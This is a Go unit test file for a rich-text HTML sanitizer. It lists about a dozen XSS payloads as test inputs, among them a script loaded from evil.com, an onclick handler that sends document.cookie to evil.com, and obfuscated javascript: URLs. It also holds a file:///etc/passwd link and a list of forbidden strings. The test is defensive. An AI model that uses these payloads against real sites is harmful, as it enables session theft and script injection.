package sanitize_test

import (
	"strings"
	"testing"

	"github.com/playhead/playhead/services/shared/sanitize"
)

func TestRichTextSanitization_AllowedContent(t *testing.T) {
	input := `<p>Hello <strong>world</strong>! Here is an <em>italic</em> note with <u>underline</u> and <s>strikethrough</s>.</p>
<h1>Title 1</h1>
<h2>Title 2</h2>
<h3>Title 3</h3>
<p>Here is <code>inline code</code> and a pre block:</p>
<pre><code>func main() {}</code></pre>
<blockquote>A smart quote</blockquote>
<hr>
<ul>
  <li>Bullet 1</li>
  <li>Bullet 2</li>
</ul>
<ol>
  <li>Ordered 1</li>
  <li>Ordered 2</li>
</ol>
<p>Highlight: <mark>important text</mark></p>
<p>Link: <a href="https://example.com" data-type="link-pill" data-id="123" class="pill">Click here</a></p>`

	sanitized := sanitize.RichText(input)

	if !strings.Contains(sanitized, "<p>") || !strings.Contains(sanitized, "<strong>world</strong>") {
		t.Fatalf("expected basic formatting preserved, got: %s", sanitized)
	}
	if !strings.Contains(sanitized, "<mark>important text</mark>") {
		t.Fatalf("expected mark tag preserved, got: %s", sanitized)
	}
	if !strings.Contains(sanitized, `href="https://example.com"`) {
		t.Fatalf("expected link href preserved, got: %s", sanitized)
	}
	if !strings.Contains(sanitized, `target="_blank"`) {
		t.Fatalf("expected target=_blank on link, got: %s", sanitized)
	}
	if !strings.Contains(sanitized, `rel="noopener noreferrer"`) {
		t.Fatalf("expected rel=noopener noreferrer on link, got: %s", sanitized)
	}
	if !strings.Contains(sanitized, `data-type="link-pill"`) {
		t.Fatalf("expected data-type attribute preserved on link pill, got: %s", sanitized)
	}
}

func TestRichTextSanitization_10KnownXSSPayloads(t *testing.T) {
	// 10 distinct XSS attack vectors from OWASP / PortSwigger cheat sheets
	payloads := []struct {
		name    string
		payload string
	}{
		{
			name:    "1. Script tag with alert",
			payload: `<script>alert('XSS-1')</script>`,
		},
		{
			name:    "2. Uppercase and mixed case SCRIPT tag",
			payload: `<sCrIpt src="http://evil.com/xss.js"></ScRiPt>`,
		},
		{
			name:    "3. Image with onerror attribute",
			payload: `<img src="invalid-image" onerror="alert('XSS-3')">`,
		},
		{
			name:    "4. SVG with onload handler",
			payload: `<svg onload="alert('XSS-4')"><circle r="10"/></svg>`,
		},
		{
			name:    "5. Iframe injection",
			payload: `<iframe src="javascript:alert('XSS-5')"></iframe>`,
		},
		{
			name:    "6. Javascript URI in anchor href",
			payload: `<a href="javascript:alert('XSS-6')">Click me</a>`,
		},
		{
			name:    "7. Data URI in anchor href with base64 script",
			payload: `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTLTcnKTwvc2NyaXB0Pg==">Malicious</a>`,
		},
		{
			name:    "8. Event handlers on valid elements (onmouseover, onclick, onload)",
			payload: `<p onmouseover="alert('XSS-8')" onclick="fetch('//evil.com/'+document.cookie)">Harmless looking text</p>`,
		},
		{
			name:    "9. Style tag / expression injection",
			payload: `<style>body { background: url('javascript:alert(1)'); }</style><p style="x:expression(alert('XSS-9'))">Styled</p>`,
		},
		{
			name:    "10. HTML entity obfuscated javascript URL and unquoted attributes",
			payload: `<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('XSS-10')">Obfuscated</a>`,
		},
		{
			name:    "11. Object and Embed tags",
			payload: `<object data="javascript:alert('XSS-11')"></object><embed src="javascript:alert('XSS-11')">`,
		},
		{
			name:    "12. Form action javascript hijacking",
			payload: `<form action="javascript:alert('XSS-12')"><button type="submit">Submit</button></form>`,
		},
	}

	for _, tc := range payloads {
		t.Run(tc.name, func(t *testing.T) {
			output := sanitize.RichText(tc.payload)

			lower := strings.ToLower(output)
			// Must never contain script tags, event handlers, or javascript: urls
			forbidden := []string{
				"<script",
				"</script",
				"<iframe",
				"<svg",
				"<img",
				"<style",
				"<object",
				"<embed",
				"<form",
				"javascript:",
				"data:text/html",
				"onerror",
				"onload",
				"onclick",
				"onmouseover",
				"alert(",
			}

			for _, f := range forbidden {
				if strings.Contains(lower, f) {
					t.Errorf("sanitizer failed on payload %q (%s): contains forbidden string %q in output: %s",
						tc.name, tc.payload, f, output)
				}
			}
		})
	}
}

func TestRichTextSanitization_LinksRestrictedToHttpHttps(t *testing.T) {
	testCases := []struct {
		input       string
		shouldExist bool
	}{
		{`<a href="https://playhead.com">Valid HTTPS</a>`, true},
		{`<a href="http://playhead.com">Valid HTTP</a>`, true},
		{`<a href="ftp://playhead.com">FTP Link</a>`, false},
		{`<a href="file:///etc/passwd">File Link</a>`, false},
		{`<a href="javascript:void(0)">JS Link</a>`, false},
	}

	for _, tc := range testCases {
		sanitized := sanitize.RichText(tc.input)
		hasLink := strings.Contains(sanitized, "<a") && strings.Contains(sanitized, "href=")
		if hasLink != tc.shouldExist {
			t.Errorf("link scheme check failed for %s: got hasLink=%v, expected=%v (output=%s)",
				tc.input, hasLink, tc.shouldExist, sanitized)
		}
	}
}
